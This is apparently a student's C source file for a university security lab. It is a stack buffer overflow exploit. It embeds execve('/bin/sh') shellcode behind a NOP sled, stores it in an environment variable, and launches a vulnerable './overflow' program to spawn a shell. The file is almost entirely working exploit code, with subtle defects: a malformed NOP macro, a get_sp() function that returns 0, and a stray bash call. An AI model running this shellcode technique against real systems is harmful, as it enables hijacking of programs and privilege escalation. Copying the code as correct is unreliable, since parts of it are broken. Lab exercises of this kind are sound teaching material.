/*
    Alejandro Martin
    CECS378
    Lab 3
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define DEFAULT_OFFSET 1564
#define DEFAULT_BUFFER_SIZE 600
#define NOP0x90

/* Shell code that does following assembly :
     xorl %eax,%eax
     pushl %eax
     pushl $0x68732f2f
     pushl $0x6e69622f
     movl %esp,%ebx
     pushl %eax
     pushl %ebx
     movl %esp,%ecx
     cdql
     movb $0x0b,%al
     int $0x80
*/
char code[] =
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80";

// Finds the stack pointer
unsigned long get_sp(void)
{
    //__asm__ - allows to include assembly language instructions directly within C code
    __asm__("movl %esp,%eax");
    return 0;
}

// Main function
int main(int argc, char **argv)
{
    // Declare variable
    char *ptr;
    // Create a buffer array to store default buffer size
    char buffer[DEFAULT_BUFFER_SIZE];
    // Declare address
    long addr;
    // Pointer is equal to buffer
    ptr = buffer;
      
    // Obtain stack pointer address in addr variable by subtracting stack pointer address with default offset
    addr = get_sp() - DEFAULT_OFFSET;
    // Outputs message with address obtained above
    printf("Using address: 0x%lx\n", addr);

    // Copies the NOP in buffer by using pointer
    for (int i = 0; i <DEFAULT_BUFFER_SIZE/2; i++)
        buffer[i] = NOP;

    // Shell code is moved via the pointer
    ptr = buffer + ((DEFAULT_BUFFER_SIZE/2) - (strlen(code)/2));
    for (int i = 0; i < strlen(code); i++)
        *(ptr++) = code[i];

    // Buffer string exits with Null
    buffer[DEFAULT_BUFFER_SIZE - 1] = '\0';

    // Moves the string into copy
    memcpy(buffer,"OVERFLOW=",9);
      
    // Environment varibale is put into buffer
    putenv(buffer);
    // System closes
    system("/bin/bash");
    // System sleeps(waits) for 1 second
    sleep(1);
    // System is overflowed
    system("./overflow $OVERFLOW");
    return 0;
}
